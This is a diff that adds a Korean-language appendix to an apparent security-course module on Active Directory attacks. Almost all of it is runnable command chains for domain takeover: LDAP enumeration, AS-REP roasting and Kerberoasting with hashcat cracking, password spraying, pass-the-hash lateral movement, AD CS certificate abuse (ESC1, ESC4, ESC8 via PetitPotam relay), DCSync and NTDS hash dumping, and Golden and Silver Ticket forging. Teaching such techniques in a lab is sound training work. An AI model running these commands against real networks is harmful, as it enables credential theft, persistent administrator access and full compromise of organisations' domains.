@@ -723,3 +723,264 @@ graph LR
 
 **학생 액션**: PoC malware 작성.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 09 AD 공격)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | impacket suite | impacket-* |
+| s2 | BloodHound + Cypher | bloodhound-python |
+| s3 | kerbrute | kerbrute |
+| s4 | certipy (AD CS) | certipy |
+| s5 | mimikatz / pypykatz | pypykatz |
+| s6 | NetExec | nxc |
+| s7 | ADRecon | adrecon |
+| s8 | LDAP enum | ldapsearch / impacket-rpcdump |
+
+### AD 공격 chain — 표준 흐름
+
+```bash
+DOMAIN=corp.local
+DC=10.0.0.1
+USER=user
+PASSWORD='Pa$$w0rd'
+
+# === Phase 1: AD 환경 정찰 ===
+
+# 1-1) LDAP enum
+impacket-rpcdump $USER:"$PASSWORD"@$DC
+ldapsearch -x -h $DC -D "$USER@$DOMAIN" -w "$PASSWORD" \
+    -b "dc=corp,dc=local"
+
+# 1-2) Domain SID + 계정 enum
+impacket-lookupsid $DOMAIN/$USER:"$PASSWORD"@$DC 0
+
+# 1-3) Domain users
+impacket-samrdump $DOMAIN/$USER:"$PASSWORD"@$DC
+
+# 1-4) ADRecon (Win 또는 PowerShell)
+# Invoke-ADRecon
+
+# === Phase 2: 자격증명 공격 ===
+
+# 2-1) AS-REP Roasting (사전 인증 비활성)
+impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -no-pass \
+    -usersfile users.txt > /tmp/asrep.txt
+
+hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
+
+# 2-2) Kerberoasting
+impacket-GetUserSPNs $DOMAIN/$USER:"$PASSWORD" -dc-ip $DC -request \
+    > /tmp/spns.txt
+
+hashcat -m 13100 /tmp/spns.txt /usr/share/wordlists/rockyou.txt
+
+# 2-3) kerbrute (사용자 enum + spray)
+kerbrute userenum -d $DOMAIN --dc $DC users.txt
+kerbrute passwordspray -d $DOMAIN --dc $DC valid-users.txt 'Spring2026!'
+
+# === Phase 3: BloodHound (path 발견) ===
+
+bloodhound-python -d $DOMAIN -u $USER -p "$PASSWORD" \
+    -ns $DC -c All --zip
+
+# Web UI 에서:
+# - Shortest Path to Domain Admin
+# - Find Kerberoastable Users
+# - Find AS-REP Roastable
+# - Find Computers with Unconstrained Delegation
+# - Find DCSync rights
+# - Find ESC1-15 (AD CS)
+
+# === Phase 4: Lateral Movement ===
+
+# 4-1) NetExec 으로 모든 host enum
+nxc smb 10.0.0.0/24 -u $USER -p "$PASSWORD"
+
+# 4-2) 자격증명 spray
+nxc smb 10.0.0.0/24 -u $USER -p "$PASSWORD" --continue-on-success
+
+# 4-3) PtH (NTLM hash 사용)
+nxc smb 10.0.0.5 -u admin -H 'NTLM_HASH'
+
+# 4-4) impacket-psexec / wmiexec
+impacket-psexec $DOMAIN/admin:'Pa$$w0rd'@10.0.0.5
+impacket-wmiexec -hashes :NTHASH $DOMAIN/admin@10.0.0.5
+
+# === Phase 5: AD CS (certipy) ===
+
+# 5-1) AD CS template enum
+certipy find -u $USER@$DOMAIN -p "$PASSWORD" -dc-ip $DC -text
+
+# 출력 (vulnerable templates):
+# [+] Found 'User' template
+# [!] Template 'User' is vulnerable to ESC1
+#     Reason: Client Authentication + SAN 조작 가능
+
+# 5-2) ESC1 — UPN 조작
+certipy req \
+    -u $USER@$DOMAIN -p "$PASSWORD" \
+    -ca CA-Server \
+    -template User \
+    -upn administrator@$DOMAIN
+
+# 출력: administrator.pfx (cert + private key)
+
+# 5-3) PFX → TGT (administrator)
+certipy auth -pfx administrator.pfx -dc-ip $DC
+# administrator.ccache + ntlm hash
+
+# 5-4) ESC4 (template ACL 약함)
+certipy template -u $USER@$DOMAIN -p "$PASSWORD" \
+    -template User -write-default-configuration
+
+# === Phase 6: Domain Admin → DC compromise ===
+
+# 6-1) DCSync (Domain Admin 권한)
+impacket-secretsdump -just-dc-ntlm $DOMAIN/$USER:"$PASSWORD"@$DC
+
+# 6-2) NTDS.dit dump (모든 user hash)
+impacket-secretsdump -just-dc $DOMAIN/$USER:"$PASSWORD"@$DC \
+    -ntds /tmp/ntds.dit -system /tmp/SYSTEM
+
+# 6-3) KRBTGT hash 획득
+grep krbtgt /tmp/dcsync.txt
+# krbtgt:502:aad3:ABC123KRBTGTHASH...
+
+# 6-4) Golden Ticket (영구 admin)
+impacket-ticketer \
+    -nthash ABC123KRBTGTHASH \
+    -domain-sid $(impacket-lookupsid $DOMAIN/admin:hash@$DC 0 | grep -oP 'S-1-5-21-[0-9-]+') \
+    -domain $DOMAIN \
+    administrator
+
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass $DOMAIN/administrator@$DC
+# 영구 admin access
+
+# 6-5) Silver Ticket (특정 service 만)
+impacket-ticketer \
+    -nthash <SERVICE_NTHASH> \
+    -domain-sid $SID \
+    -domain $DOMAIN \
+    -spn cifs/file-server.$DOMAIN \
+    administrator
+```
+
+### Unconstrained Delegation 공격
+
+```bash
+# === 1. UD 보유 host 발견 (BloodHound) ===
+# Cypher: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
+
+# === 2. UD 호스트 침해 ===
+# 일반 lateral 으로 침투
+
+# === 3. UD 호스트에서 TGT 수집 ===
+# Win 의 경우:
+# Rubeus.exe monitor /interval:5
+
+# Linux 의 경우:
+# 침투한 UD host 에서 PrintBug / PetitPotam 으로 DC 인증 강요
+git clone https://github.com/topotam/PetitPotam ~/petitpotam
+python3 ~/petitpotam/PetitPotam.py UD-HOST DC-IP
+# DC 가 UD-HOST 에 NTLM 인증 → UD-HOST 가 DC 의 TGT 캐시
+
+# === 4. TGT export → Domain Admin 위장 ===
+# Pypykatz 으로 TGT 추출
+pypykatz lsa minidump /tmp/ud-host-mem.dmp
+
+# 또는 sliver session 에서:
+sliver (ud-host) > execute 'rubeus dump'
+```
+
+### Constrained Delegation 공격
+
+```bash
+# === BloodHound query: Constrained Delegation 보유 ===
+# MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u, c
+
+# === Constrained Delegation 악용 ===
+# user 가 service-A.corp.local 으로만 delegation 허용
+# 우리가 user 자격증명 가지고 있으면:
+
+# 1) S4U2self
+impacket-getST $DOMAIN/$USER:"$PASSWORD" \
+    -spn cifs/service-a.corp.local \
+    -dc-ip $DC \
+    -impersonate administrator                              # admin 사칭
+
+# 2) S4U2proxy → service-A 의 administrator 권한 ticket
+# 출력: administrator.ccache
+
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass $DOMAIN/administrator@service-a.corp.local
+```
+
+### LDAP Reconnaissance
+
+```bash
+# === 1. Anonymous bind (드물게 가능) ===
+ldapsearch -x -H ldap://$DC -b "dc=corp,dc=local"
+
+# === 2. 인증된 query ===
+ldapsearch -x -H ldap://$DC \
+    -D "$USER@$DOMAIN" -w "$PASSWORD" \
+    -b "dc=corp,dc=local" \
+    "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))"
+
+# === 3. 모든 user ===
+ldapsearch -x -H ldap://$DC \
+    -D "$USER@$DOMAIN" -w "$PASSWORD" \
+    -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
+
+# === 4. 모든 computer ===
+ldapsearch -x -H ldap://$DC \
+    -D "$USER@$DOMAIN" -w "$PASSWORD" \
+    -b "dc=corp,dc=local" "(objectClass=computer)" cn
+
+# === 5. SPN 보유 (Kerberoastable) ===
+ldapsearch -x -H ldap://$DC \
+    -D "$USER@$DOMAIN" -w "$PASSWORD" \
+    -b "dc=corp,dc=local" \
+    "(&(samAccountType=805306368)(servicePrincipalName=*))"
+
+# === 6. Pre-auth 비활성 (AS-REP Roastable) ===
+ldapsearch -x -H ldap://$DC \
+    -D "$USER@$DOMAIN" -w "$PASSWORD" \
+    -b "dc=corp,dc=local" \
+    "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+```
+
+### NTLM Relay (PetitPotam → ADCS)
+
+```bash
+# === Scenario: PetitPotam + ADCS ESC8 (자격증명 없이 Domain Admin) ===
+
+# 1) ntlmrelayx (target 은 AD CS)
+impacket-ntlmrelayx \
+    -t http://CA-Server.$DOMAIN/certsrv/certfnsh.asp \
+    --template DomainController \
+    -smb2support
+
+# 2) PetitPotam (DC 가 attacker 로 NTLM 인증)
+git clone https://github.com/topotam/PetitPotam ~/petitpotam
+python3 ~/petitpotam/PetitPotam.py 192.168.0.112 $DC
+
+# 3) ntlmrelayx 가 자동:
+#    - DC 의 NTLM 인증 받음
+#    - AD CS 에 cert 요청 (DomainController template)
+#    - DC machine cert 받음 → DA 권한
+
+# 4) cert → TGT
+certipy auth -pfx dc-machine.pfx -dc-ip $DC
+
+# 5) DCSync
+impacket-secretsdump -just-dc-ntlm $DOMAIN/$USER:"$PASSWORD"@$DC
+```
+
+학생은 본 9주차에서 **impacket suite + BloodHound + kerbrute + certipy + pypykatz + NetExec + ADRecon + ldapsearch + ntlmrelayx + PetitPotam** 10 도구로 AD 공격의 advanced chain (LDAP enum → Kerberoasting → BloodHound path → AD CS → DCSync → Golden Ticket) 을 OSS 만으로 익힌다.
